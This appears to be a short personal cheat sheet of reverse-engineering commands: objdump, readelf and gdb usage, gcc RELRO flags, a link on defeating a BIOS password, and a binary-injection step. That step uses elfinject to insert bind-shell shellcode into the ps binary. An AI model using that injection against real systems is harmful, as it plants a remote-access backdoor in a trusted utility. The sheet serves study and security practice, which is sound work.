```
simple disassembly of an object file
$ objdump -M intel -d <filename>.o
check relocations inside the object file
$ readelf --relocs compilation_example.o
full binary disassembly
$ objdump -M intel -d <filename>.out
```

Set a breakpoint  
```
(gdb) b *0x[address]
Show the registers
(gdb) info registers [specific register]
Dump a string at memory address
(gdb) x/s 0x[memory_address]
Dump a four hex words at memory address
(gdb) x/4xw 0x[memory_address]
```

Partial RELRO  
```
gcc -g -Wl,-z,relro -o test testcase.c
Full RELRO
gcc -g -Wl,-z,relro,-z,now -o test testcase.c
```

Binary Injection  
Assemble a raw binary (removing any ELF overhead and leaving just the code)  
```
nasm -f bin -o test.bin test.s
Inject shellcode into an ELF
elfinject ps bindshell.bin ".injected" 0x800000 -1
```



# Physical attacks
  
  
 # BIOS
 https://github.com/skysafe/reblog/blob/main/0000-defeating-a-laptops-bios-password/README.md

